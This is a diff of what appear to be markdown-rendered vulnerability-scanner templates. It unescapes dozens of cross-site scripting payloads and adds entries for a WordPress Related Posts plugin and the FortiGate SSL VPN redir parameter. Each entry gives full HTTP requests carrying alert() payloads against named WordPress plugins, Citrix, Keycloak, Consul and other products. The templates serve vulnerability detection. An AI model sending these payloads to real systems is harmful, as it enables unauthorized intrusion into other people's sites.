@@ -238,7 +238,7 @@ log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1
 ```
 ### Step - 2
 ```
-GET /wp-admin/edit.php?post_type=wbcr-snippets&page=import-wbcr_insert_php&a">\<script>alert(1)\</script> HTTP/1.1
+GET /wp-admin/edit.php?post_type=wbcr-snippets&page=import-wbcr_insert_php&a"><script>alert(1)</script> HTTP/1.1
 Host: {{Hostname}}
 
 ```
@@ -280,7 +280,7 @@ log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1
 ```
 ### Step - 2
 ```
-GET /wp-admin/admin.php?page=gonzales-wbcr_clearfy&action=index&wbcr_assets_manager=1&a">\<script>alert(1)\</script> HTTP/1.1
+GET /wp-admin/admin.php?page=gonzales-wbcr_clearfy&action=index&wbcr_assets_manager=1&a"><script>alert(1)</script> HTTP/1.1
 Host: {{Hostname}}
 
 ```
@@ -376,7 +376,7 @@ log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1
 ```
 ### Step - 2
 ```
-GET /wp-admin/admin.php?page=wc-settings&tab=wooccm&section=advanced&">-->\<script>alert(1)\</script> HTTP/1.1
+GET /wp-admin/admin.php?page=wc-settings&tab=wooccm&section=advanced&">--><script>alert(1)</script> HTTP/1.1
 Host: {{Hostname}}
 
 ```
@@ -416,7 +416,7 @@ log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1
 ```
 ### Step - 2
 ```
-GET /wp-admin/options-general.php?page=wp-shortpixel-settings&">\<script>alert(1)\</script> HTTP/1.1
+GET /wp-admin/options-general.php?page=wp-shortpixel-settings&"><script>alert(1)</script> HTTP/1.1
 Host: {{Hostname}}
 
 ```
@@ -721,7 +721,7 @@ log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1
 ```
 ### Step - 2
 ```
-GET /wp-admin/admin.php?page=jj4t3-logs&a">\<script>alert(1)\</script> HTTP/1.1
+GET /wp-admin/admin.php?page=jj4t3-logs&a"><script>alert(1)</script> HTTP/1.1
 Host: {{Hostname}}
 
 ```
@@ -763,7 +763,7 @@ log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1
 ```
 ### Step - 2
 ```
-GET /wp-admin/admin.php?page=pmxe-admin-manage&a">\<script>alert(1)\</script> HTTP/1.1
+GET /wp-admin/admin.php?page=pmxe-admin-manage&a"><script>alert(1)</script> HTTP/1.1
 Host: {{Hostname}}
 
 ```
@@ -805,7 +805,7 @@ log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1
 ```
 ### Step - 2
 ```
-GET /wp-admin/admin.php?page=snippets&tag=\</script>\<script>alert(document.domain)\</script> HTTP/1.1
+GET /wp-admin/admin.php?page=snippets&tag=</script><script>alert(document.domain)</script> HTTP/1.1
 Host: {{Hostname}}
 
 ```
@@ -998,7 +998,7 @@ log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1
 ```
 ### Step - 2
 ```
-GET /wp-admin/admin.php?page=wc-reports&a">\<script>alert(1)\</script> HTTP/1.1
+GET /wp-admin/admin.php?page=wc-reports&a"><script>alert(1)</script> HTTP/1.1
 Host: {{Hostname}}
 
 ```
@@ -1116,7 +1116,7 @@ log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1
 ```
 ### Step - 2
 ```
-GET /wp-admin/edit.php?post_type=modula-gallery&page=modula-addons&a">\<script>alert(1)\</script> HTTP/1.1
+GET /wp-admin/edit.php?post_type=modula-gallery&page=modula-addons&a"><script>alert(1)</script> HTTP/1.1
 Host: {{Hostname}}
 
 ```
@@ -1296,6 +1296,47 @@ Test
     1. 200
 
 ---
+# WordPress Related Posts \<= 2.1.1 - Cross Site Scripting
+## Description
+- WordPress Related Posts plugin before 2.1.1 contains an Reflected XSS via rp4wp_parent
+
+- severity - medium
+- tags - wordpress,wp,wp-plugin,xss,relatedposts,authenticated
+## Requests
+### Step - 1
+```
+POST /wp-login.php HTTP/1.1
+Host: {{Hostname}}
+Content-Type: application/x-www-form-urlencoded
+
+log={{username}}&pwd={{password}}&wp-submit=Log+In
+
+```
+### Step - 2
+```
+GET /wp-admin/admin.php?page=rp4wp_link_related&rp4wp_parent=156x%27%22%3E%3Cimg+src%3Dx+onerror%3Dalert%28document.domain%29%3E HTTP/1.1
+Host: {{Hostname}}
+
+```
+### Matchers
+
+**Type - word**
+- part - body
+- words
+    1. \<img src=x onerror=alert(document.domain)>&action=edit
+    2. All Posts\</a>
+- condition - and
+
+**Type - word**
+- part - header
+- words
+    1. text/html
+
+**Type - status**
+- status
+    1. 200
+
+---
 # WordPress Securimage-WP 3.2.4 - Cross-Site Scripting
 ## Description
 - WordPress Securimage-WP 3.2.4 plugin contains a cross-site scripting vulnerability via siwp_test.php. An attacker can execute arbitrary script in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.
@@ -1367,7 +1408,7 @@ log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1
 ```
 ### Step - 2
 ```
-GET /wp-admin/admin.php?page=wpo_wcpdf_options_page&tab=documents&section=invoice&">\<script>alert(document.domain)\</script> HTTP/1.1
+GET /wp-admin/admin.php?page=wpo_wcpdf_options_page&tab=documents&section=invoice&"><script>alert(document.domain)</script> HTTP/1.1
 Host: {{Hostname}}
 
 ```
@@ -1809,7 +1850,7 @@ Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFboH5ITu7DsGIG
 ------WebKitFormBoundaryFboH5ITu7DsGIGrD
 Content-Disposition: form-data; name="todate"
 
-2022-12-22\<script>alert(document.domain)\</script>
+2022-12-22<script>alert(document.domain)</script>
 ------WebKitFormBoundaryFboH5ITu7DsGIGrD
 Content-Disposition: form-data; name="search"
 
@@ -1817,7 +1858,7 @@ Content-Disposition: form-data; name="search"
 ------WebKitFormBoundaryFboH5ITu7DsGIGrD
 Content-Disposition: form-data; name="fromdate"
 
-2022-06-22\<script>alert(document.domain)\</script>
+2022-06-22<script>alert(document.domain)</script>
 ------WebKitFormBoundaryFboH5ITu7DsGIGrD--
 
 ```
@@ -2286,11 +2327,11 @@ Content-Disposition: form-data; name="id"
 ------WebKitFormBoundaryCMJ5bh3B6m9767Em
 Content-Disposition: form-data; name="name"
 
-\</script>\<script>alert(document.domain)\</script>
+</script><script>alert(document.domain)</script>
 ------WebKitFormBoundaryCMJ5bh3B6m9767Em
 Content-Disposition: form-data; name="description"
 
-\<script>alert(document.domain)\</script>
+<script>alert(document.domain)</script>
 ------WebKitFormBoundaryCMJ5bh3B6m9767Em--
 
 ```
@@ -2868,7 +2909,7 @@ POST /index.php?mod=system&op=orgtree&do=orgtree HTTP/1
 Host: {{Hostname}}
 Content-Type: application/x-www-form-urlencoded; charset=UTF-8
 
-id=%23&nouser=0&moderator=0&zero=\<img+src=x+onerror=alert(document.domain)>&stype=0&range=0&showjob=0
+id=%23&nouser=0&moderator=0&zero=<img+src=x+onerror=alert(document.domain)>&stype=0&range=0&showjob=0
 
 ```
 ### Matchers
@@ -2899,7 +2940,7 @@ POST /auth/realms/master/clients-registrations/openid-connect HTTP/1.1
 Host: {{Hostname}}
 Content-Type: application/json
 
-{"\<img onerror=confirm(1337) src/>":1}
+{"<img onerror=confirm(1337) src/>":1}
 
 ```
 ### Matchers
@@ -2988,7 +3029,7 @@ blog
 ------WebKitFormBoundaryT8dS2PT0WtxACLyu
 Content-Disposition: form-data; name="bf_text"
 
-">\<img src=x onerror=console.log(123);>
+"><img src=x onerror=console.log(123);>
 ------WebKitFormBoundaryT8dS2PT0WtxACLyu
 Content-Disposition: form-data; name="file"; filename=""
 Content-Type: application/octet-stream
@@ -3849,7 +3890,7 @@ Host: {{Hostname}}
 Content-Type: application/x-www-form-urlencoded
 X-NITRO-USER: xpyZxwy6
 
-sid=254&pe=1,2,3,4,5&appname=%0a\</title>\<script>alert(31337)\</script>&au=1&username=nsroot
+sid=254&pe=1,2,3,4,5&appname=%0a</title><script>alert(31337)</script>&au=1&username=nsroot
 
 ```
 ### Matchers
@@ -3947,7 +3988,7 @@ Connection: close
 PUT {{BaseURL}}/v1/kv/{{randstr}} HTTP/1.1
 Host: {{Hostname}}
 
-\<!DOCTYPE html>\<script>alert(document.domain)\</script>
+<!DOCTYPE html><script>alert(document.domain)</script>
 
 ```
 ### Step - 2
@@ -4045,7 +4086,7 @@ doctorspecilization=%3C%2Ftd%3E%3Cscript%3Ealert%28document.domain%29%3B%3C%2Fsc
 ## Description
 - Agentejo Cockpit 0.10.2 contains a reflected cross-site scripting vulnerability due to insufficient sanitization of the to parameter in the /auth/login route, which allows for injection of arbitrary JavaScript code into a web page's content.
 - severity - medium
-- tags - cve,cve2022,cockpit,agentejo,xss,oss
+- tags - cve,cve2020,cockpit,agentejo,xss,oss
 ## Requests
 - Method - GET
 ### URL
@@ -4183,7 +4224,7 @@ SAMLResponse=%22%3E%3Csvg/onload=alert(/{{randstr}}/)%3E
 ## Requests
 ### Step - 1
 ```
-GET /?cda'"\</script>\<script>alert(document.domain)\</script>&locale=locale=de-DE HTTP/1.1 HTTP/1.1
+GET /?cda'"</script><script>alert(document.domain)</script>&locale=locale=de-DE HTTP/1.1 HTTP/1.1
 Host: {{Hostname}}
 
 ```
@@ -4526,7 +4567,7 @@ Connection: close
 ```
 GET /user/login.php HTTP/1.1
 Host: {{Hostname}}
-Referer: xss"/>\<img src="#" onerror="alert(document.domain)"/>
+Referer: xss"/><img src="#" onerror="alert(document.domain)"/>
 
 ```
 ### Matchers
@@ -4956,7 +4997,7 @@ Referer: xss"/>\<img src="#" onerror="alert(document.domain)"/>
 - Cute Editor for ASP.NET 6.4 is vulnerable to reflected cross-site scripting (XSS) caused by improper validation of user supplied input. A remote attacker could exploit this vulnerability using a specially crafted URL to execute a script in a victim's Web browser within the security context of the hosting Web site, once the URL is clicked. An attacker could use this vulnerability to steal the victim's cookie-based authentication credentials.
 
 - severity - medium
-- tags - cve,cve2022,cuteeditor,xss,seclists
+- tags - cve,cve2020,cuteeditor,xss,seclists
 ## Requests
 - Method - GET
 ### URL
@@ -5770,7 +5811,7 @@ log={{username}}&pwd={{password}}&wp-submit=Log+In
 ```
 ### Step - 2
 ```
-GET /wp-admin/edit.php?s&post_status=all&post_type=nf_sub&action=-1&form_id=1&nf_form_filter&begin_date=">\<img+src%3Dx+onerror%3Dalert%28document.domain%29%3B%2F%2F&end_date&filter_action=Filter&paged=1&action2=-1 HTTP/1.1
+GET /wp-admin/edit.php?s&post_status=all&post_type=nf_sub&action=-1&form_id=1&nf_form_filter&begin_date="><img+src%3Dx+onerror%3Dalert%28document.domain%29%3B%2F%2F&end_date&filter_action=Filter&paged=1&action2=-1 HTTP/1.1
 Host: {{Hostname}}
 
 ```
@@ -6409,7 +6450,7 @@ Host: {{BaseURL}}
 ```
 ### Step - 2
 ```
-GET /cs/Satellite?destpage="\<h1xxx">\<script>alert(document.domain)\</script>&pagename=OpenMarket%2FXcelerate%2FUIFramework%2FLoginError HTTP/1.1
+GET /cs/Satellite?destpage="<h1xxx"><script>alert(document.domain)</script>&pagename=OpenMarket%2FXcelerate%2FUIFramework%2FLoginError HTTP/1.1
 Host: {{BaseURL}}
 
 ```
@@ -6538,7 +6579,7 @@ Host: {{Hostname}}
 - Method - POST
 ### URL
 - {{BaseURL}}/wp-admin/admin.php
-  - icl_post_action=save_theme_localization&locale_file_name_en=EN">\<script>alert(0);\</script>
+  - icl_post_action=save_theme_localization&locale_file_name_en=EN"><script>alert(0);</script>
 
 ### Matchers
 
@@ -6729,7 +6770,7 @@ Host: {{Hostname}}
 ## Requests
 ### Step - 1
 ```
-GET /cs/Satellite?pagename=OpenMarket/Gator/FlexibleAssets/AssetMaker/complexassetmaker&cs_imagedir=qqq">\<script>alert(document.domain)\</script> HTTP/1.1
+GET /cs/Satellite?pagename=OpenMarket/Gator/FlexibleAssets/AssetMaker/complexassetmaker&cs_imagedir=qqq"><script>alert(document.domain)</script> HTTP/1.1
 Host: {{Hostname}}
 
 ```
@@ -6960,6 +7001,33 @@ Host: {{Hostname}}
     1. 200
 
 ---
+# FortiGate SSL VPN Web Portal - Cross Site Scripting
+## Description
+- Failure to sanitize the login redir parameter in the SSL-VPN web portal may allow an attacker to perform a Cross-site Scripting (XSS) or an URL Redirection attack.
+
+- severity - medium
+- tags - cve,cve2017,fortigate,xss,fortinet
+## Requests
+- Method - GET
+### URL
+- {{BaseURL}}/remote/loginredir?redir=javascript:alert(document.domain)
+### Matchers
+
+**Type - word**
+- part - body
+- words
+    1. location=decodeURIComponent("javascript%3Aalert%28document.domain%29"
+
+**Type - word**
+- part - header
+- words
+    1. text/html
+
+**Type - status**
+- status
+    1. 200
+
+---
 # AvantFAX 3.3.3 - Cross-Site Scripting
 ## Description
 - AvantFAX 3.3.3 contains a cross-site scripting vulnerability via an arbitrary parameter name submitted to the default URL, as demonstrated by a parameter whose name contains a SCRIPT element and whose value is 1.
@@ -6972,7 +7040,7 @@ POST / HTTP/1.1
 Host: {{Hostname}}
 Content-Type: application/x-www-form-urlencoded
 
-username=admin&password=admin&_submit_check=1&jlbqg\<script>alert("{{randstr}}")\</script>b7g0x=1
+username=admin&password=admin&_submit_check=1&jlbqg<script>alert("{{randstr}}")</script>b7g0x=1
 
 ```
 ### Matchers
@@ -7209,7 +7277,7 @@ username=admin&password=admin&_submit_check=1&jlbqg\<script>alert("{{randstr}}")
 ## Requests
 ### Step - 1
 ```
-GET /webadmin/pkg?command=\<script>alert(document.cookie)\</script> HTTP/1.1
+GET /webadmin/pkg?command=<script>alert(document.cookie)</script> HTTP/1.1
 Host: {{Hostname}}
 Content-Type: application/x-www-form-urlencoded
 
@@ -8089,7 +8157,7 @@ log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1
 ```
 ### Step - 2
 ```
-GET /wp-admin/?step=demo&page=owp_setup&a">\<script>alert(/XSS/)\</script>   HTTP/1.1
+GET /wp-admin/?step=demo&page=owp_setup&a"><script>alert(/XSS/)</script>   HTTP/1.1
 Host: {{Hostname}}
 
 ```
@@ -8724,7 +8792,7 @@ POST /wp-admin/options.php HTTP/1.1
 Host: {{Hostname}}
 Content-Type: application/x-www-form-urlencoded
 
-option_page=iqblockcountry-settings-group&action=update&_wpnonce={{nonce}}&_wp_http_referer=%2Fwordpress%2Fwp-admin%2Foptions-general.php%3Fpage%3Diq-block-country%2Flibs%2Fblockcountry-settings.php&blockcountry_blockmessage=test\</textarea>\<script>alert(document.domain)\</script>&blockcountry_redirect=2&blockcountry_redirect_url=&blockcountry_header=on&blockcountry_nrstatistics=15&blockcountry_daysstatistics=30&blockcountry_geoapikey=&blockcountry_apikey=&blockcountry_ipoverride=NONE&blockcountry_debuglogging=on
+option_page=iqblockcountry-settings-group&action=update&_wpnonce={{nonce}}&_wp_http_referer=%2Fwordpress%2Fwp-admin%2Foptions-general.php%3Fpage%3Diq-block-country%2Flibs%2Fblockcountry-settings.php&blockcountry_blockmessage=test</textarea><script>alert(document.domain)</script>&blockcountry_redirect=2&blockcountry_redirect_url=&blockcountry_header=on&blockcountry_nrstatistics=15&blockcountry_daysstatistics=30&blockcountry_geoapikey=&blockcountry_apikey=&blockcountry_ipoverride=NONE&blockcountry_debuglogging=on
 
 ```
 ### Step - 4
@@ -8897,7 +8965,7 @@ log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1
 ```
 ### Step - 2
 ```
-GET /wp-admin/admin.php?page=fv_player_stats&player_id=1\</script>\<script>alert(document.domain)\</script> HTTP/1.1
+GET /wp-admin/admin.php?page=fv_player_stats&player_id=1</script><script>alert(document.domain)</script> HTTP/1.1
 Host: {{Hostname}}
 
 ```
@@ -8953,7 +9021,7 @@ Content-Disposition: form-data; name="brandname"
 ------WebKitFormBoundarypWqYipqU21aYgccv
 Content-Disposition: form-data; name="vehicalorcview"
 
-\</script>\<script>alert(document.domain)\</script>
+</script><script>alert(document.domain)</script>
 ------WebKitFormBoundarypWqYipqU21aYgccv
 Content-Disposition: form-data; name="priceperday"
 
@@ -9122,7 +9190,7 @@ Host: {{Hostname}}
 Accept: */*
 Content-Type: application/x-www-form-urlencoded
 
-action=tie_ajax_search&query[]=\</script>\<script>alert(document.domain)\</script>
+action=tie_ajax_search&query[]=</script><script>alert(document.domain)</script>
 
 ```
 ### Matchers
@@ -9398,7 +9466,7 @@ log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1
 ```
 ### Step - 2
 ```
-GET /wp-admin/admin.php?page=easy-facebook-likebox&access_token=a&type=\</script>\<script>alert(document.domain)\</script> HTTP/1.1
+GET /wp-admin/admin.php?page=easy-facebook-likebox&access_token=a&type=</script><script>alert(document.domain)</script> HTTP/1.1
 Host: {{Hostname}}
 
 ```
@@ -9745,7 +9813,7 @@ log={{username}}&pwd={{password}}&wp-submit=Log+In
 ```
 ### Step - 2
 ```
-GET /wp-admin/admin.php/">\<script>alert(document.domain)\</script>/?page=under-construction HTTP/1.1
+GET /wp-admin/admin.php/"><script>alert(document.domain)</script>/?page=under-construction HTTP/1.1
 Host: {{Hostname}}
 
 ```
@@ -9938,7 +10006,7 @@ log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1
 ```
 ### Step - 2
 ```
-GET /wp-admin/admin.php?page=domain-check-profile&domain=test.foo\<script>alert(document.domain)\</script> HTTP/1.1
+GET /wp-admin/admin.php?page=domain-check-profile&domain=test.foo<script>alert(document.domain)</script> HTTP/1.1
 Host: {{Hostname}}
 
 ```
@@ -10834,7 +10902,7 @@ POST /wp-admin/options.php HTTP/1.1
 Host: {{Hostname}}
 Content-Type: application/x-www-form-urlencoded
 
-option_page=customize-login-image-settings-group&action=update&_wpnonce={{nonce}}&_wp_http_referer=%2Fwordpress%2Fwp-admin%2Foptions-general.php%3Fpage%3Dcustomize-login-image%252Fcustomize-login-image-options.php%26settings-updated%3Dtrue&cli_logo_url=\<script>alert(document.domain)\</script>&cli_logo_file=&cli_login_background_color=&cli_custom_css=
+option_page=customize-login-image-settings-group&action=update&_wpnonce={{nonce}}&_wp_http_referer=%2Fwordpress%2Fwp-admin%2Foptions-general.php%3Fpage%3Dcustomize-login-image%252Fcustomize-login-image-options.php%26settings-updated%3Dtrue&cli_logo_url=<script>alert(document.domain)</script>&cli_logo_file=&cli_login_background_color=&cli_custom_css=
 
 ```
 ### Step - 4
@@ -11008,7 +11076,7 @@ Host: {{Hostname}}
 Accept: */*
 Content-Type: application/x-www-form-urlencoded
 
-lang=en_US&cat_id=6">\</script>\<script>alert(document.domain)\</script>&action=jnews_build_mega_category_2&number=6&tags=70%2C64%2C10%2C67
+lang=en_US&cat_id=6"></script><script>alert(document.domain)</script>&action=jnews_build_mega_category_2&number=6&tags=70%2C64%2C10%2C67
 
 ```
 ### Matchers
@@ -11405,7 +11473,7 @@ POST /wp-json/visualizer/v1/update-chart HTTP/1.1
 Host: {{Hostname}}
 Content-Type: application/json
 
-{"id": 7, "visualizer-chart-type": "\<script>alert(document.domain)\</script>"}
+{"id": 7, "visualizer-chart-type": "<script>alert(document.domain)</script>"}
 
 ```
 ### Matchers
@@ -11490,7 +11558,7 @@ POST /wp-admin/options-general.php?page=yuzo-related-post HTTP/1.1
 Host: {{Hostname}}
 Content-Type: application/x-www-form-urlencoded
 
-yuzo_related_post_css_and_style=\</style>\<script>alert(0);\</script>
+yuzo_related_post_css_and_style=</style><script>alert(0);</script>
 
 ```
 ### Step - 2
@@ -12167,7 +12235,7 @@ Host: {{Hostname}}
 ### URL
 - {{BaseURL}}/kindeditor/php/demo.php
 - {{BaseURL}}/php/demo.php
-  - content1=\</script>\<script>alert(document.domain)\</script>&button=%E6%8F%90%E4%BA%A4%E5%86%85%E5%AE%B9
+  - content1=</script><script>alert(document.domain)</script>&button=%E6%8F%90%E4%BA%A4%E5%86%85%E5%AE%B9
 ### Matchers
 
 **Type - word**
@@ -12634,7 +12702,7 @@ log={{username}}&pwd={{password}}&wp-submit=Log+In
 ```
 ### Step - 2
 ```
-GET /wp-admin/admin.php?page=pm_add_group&id=">\<script>alert%28document.domain%29\<%2Fscript> HTTP/1.1
+GET /wp-admin/admin.php?page=pm_add_group&id="><script>alert%28document.domain%29<%2Fscript> HTTP/1.1
 Host: {{Hostname}}
 
 ```
@@ -12714,7 +12782,7 @@ Host: {{Hostname}}
 ```
 GET /wnm/login/login.json HTTP/1.1
 Host: {{Hostname}}
-Cookie: svpnlang=\<script>alert('document.domain')\</script>
+Cookie: svpnlang=<script>alert('document.domain')</script>
 
 ```
 ### Matchers
@@ -13134,7 +13202,7 @@ POST /cgi-bin/login.cgi HTTP/1.1
 Host: {{Hostname}}
 Content-Type: application/x-www-form-urlencoded
 
-newUI=1&page=login&username=admin&langChange=0&ipaddr=x.x.x.x&login_page=login.shtml&homepage=main.shtml&sysinitpage=sysinit.shtml&hostname=")\</script>\<script>alert(document.domain);\</script>&key=M27234733&password=63a36bceec2d3bba30d8611c323f4cda&lang_=cn
+newUI=1&page=login&username=admin&langChange=0&ipaddr=x.x.x.x&login_page=login.shtml&homepage=main.shtml&sysinitpage=sysinit.shtml&hostname=")</script><script>alert(document.domain);</script>&key=M27234733&password=63a36bceec2d3bba30d8611c323f4cda&lang_=cn
 
 ```
 ### Matchers
@@ -13354,7 +13422,7 @@ username={{username}}&password={{password}}
 ```
 ### Step - 2
 ```
-GET /ajax.php?f=getPipelineJobOrder&joborderID=1&page=0&entriesPerPage=1&sortBy=dateCreatedInt&sortDirection=desc&indexFile=15)">\</a>\<script>alert(document.domain)\</script>&isPopup=0 HTTP/1.1
+GET /ajax.php?f=getPipelineJobOrder&joborderID=1&page=0&entriesPerPage=1&sortBy=dateCreatedInt&sortDirection=desc&indexFile=15)"></a><script>alert(document.domain)</script>&isPopup=0 HTTP/1.1
 Host: {{Hostname}}
 
 ```
@@ -13497,7 +13565,7 @@ username={{username}}&password={{password}}
 ```
 ### Step - 2
 ```
-GET /ajax.php?f=getPipelineJobOrder&joborderID=2&page=0&entriesPerPage=15)">\</a>%20\<script>alert(document.domain)\</script>&sortBy=dateCreatedInt&sortDirection=desc&indexFile=index.php&isPopup=0 HTTP/1.1
+GET /ajax.php?f=getPipelineJobOrder&joborderID=2&page=0&entriesPerPage=15)"></a>%20<script>alert(document.domain)</script>&sortBy=dateCreatedInt&sortDirection=desc&indexFile=index.php&isPopup=0 HTTP/1.1
 Host: {{Hostname}}
 
 ```
@@ -13538,7 +13606,7 @@ username={{username}}&password={{password}}
 ```
 ### Step - 2
 ```
-GET /ajax.php?f=getPipelineJobOrder&joborderID=1)">\</a>%20\<script>alert(document.domain)\</script>&page=0&entriesPerPage=1&sortBy=dateCreatedInt&sortDirection=desc&indexFile=index.php&isPopup=0 HTTP/1.1
+GET /ajax.php?f=getPipelineJobOrder&joborderID=1)"></a>%20<script>alert(document.domain)</script>&page=0&entriesPerPage=1&sortBy=dateCreatedInt&sortDirection=desc&indexFile=index.php&isPopup=0 HTTP/1.1
 Host: {{Hostname}}
 
 ```
@@ -13707,7 +13775,7 @@ POST /edms/search-result.php HTTP/1.1
 Host: {{Hostname}}
 Content-Type: application/x-www-form-urlencoded; charset=UTF-8
 
-searchdata=\<script>alert(document.domain);\</script>
+searchdata=<script>alert(document.domain);</script>
 
 ```
 ### Matchers
@@ -13766,7 +13834,7 @@ Content-Disposition: form-data; name="chunks"
 Content-Disposition: form-data; name="file"; filename="blob"
 Content-Type: application/octet-stream
 
-\<x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(document.domain)\</x:script>
+<x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(document.domain)</x:script>
 -----------------------------59866212126262636974202255034--
 
 ```
@@ -13924,7 +13992,7 @@ username={{username}}&password={{password}}
 ```
 ### Step - 2
 ```
-GET /index.php?m=toolbar&callback=\<script>alert(document.domain)\</script>&a=authenticate HTTP/1.1
+GET /index.php?m=toolbar&callback=<script>alert(document.domain)</script>&a=authenticate HTTP/1.1
 Host: {{Hostname}}
 
 ```
@@ -14037,7 +14105,7 @@ Host: {{Hostname}}
 - Method - POST
 ### URL
 - {{BaseURL}}
-  - html_element_selection=\</script>\<img+src+onerror=alert(document.domain)>
+  - html_element_selection=</script><img+src+onerror=alert(document.domain)>
 
 ### Matchers
 
@@ -14372,7 +14440,7 @@ click
 Content-Disposition: form-data; name="upload-file"; filename="{{randstr}}.svg"
 Content-Type: image/jpeg
 
-\<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>
+<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>
 -----------------------------92633278134516118923780781161--
 
 ```
@@ -14503,7 +14571,7 @@ log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1
 ```
 ### Step - 2
 ```
-GET /wp-admin/admin.php?page=mmursp-list&view=edit&mmursp_id=">\<svg/onload=alert(document.domain)> HTTP/1.1
+GET /wp-admin/admin.php?page=mmursp-list&view=edit&mmursp_id="><svg/onload=alert(document.domain)> HTTP/1.1
 Host: {{Hostname}}
 
 ```
@@ -14532,7 +14600,7 @@ Host: {{Hostname}}
 ```
 GET /iupjournals/index.php/esj HTTP/2
 Host: {{Hostname}}
-X-Forwarded-Host: foo">\<script>alert(document.domain)\</script>\<x=".com
+X-Forwarded-Host: foo"><script>alert(document.domain)</script><x=".com
 
 ```
 ### Matchers
@@ -14682,7 +14750,7 @@ Host: {{Hostname}}
 Content-Type: application/x-www-form-urlencoded; charset=UTF-8
 Referer: {{BaseURL}}/admin/view:settings
 
-id=0&name=vat1&type=">\<img+src%3dx+onerror%3dalert(document.domain)>&rate=10
+id=0&name=vat1&type="><img+src%3dx+onerror%3dalert(document.domain)>&rate=10
 
 ```
 ### Step - 3
@@ -14972,7 +15040,7 @@ Host: {{Hostname}}
 POST /login.php HTTP/1.1
 Host: {{Hostname}}
 Content-Type: application/x-www-form-urlencoded
-Referer: ">\<script>alert(document.domain)\</script>\<"
+Referer: "><script>alert(document.domain)</script><"
 
 language=en&user=user&pass=pass&submit=Login
 
@@ -15023,7 +15091,7 @@ language=en&user=user&pass=pass&submit=Login
 ## Requests
 ### Step - 1
 ```
-GET /kfm/index.php/'\<script>alert(document.domain);\</script> HTTP/1.1
+GET /kfm/index.php/'<script>alert(document.domain);</script> HTTP/1.1
 Host: {{Hostname}}
 
 ```
@@ -15549,7 +15617,7 @@ username={{username}}&password={{password}}
 ```
 ### Step - 2
 ```
-GET /index.php?m=toolbar&callback=abcd&a=checkEmailIsInSystem&email=\</script>\<script>alert(document.domain)\</script> HTTP/1.1
+GET /index.php?m=toolbar&callback=abcd&a=checkEmailIsInSystem&email=</script><script>alert(document.domain)</script> HTTP/1.1
 Host: {{Hostname}}
 
 ```
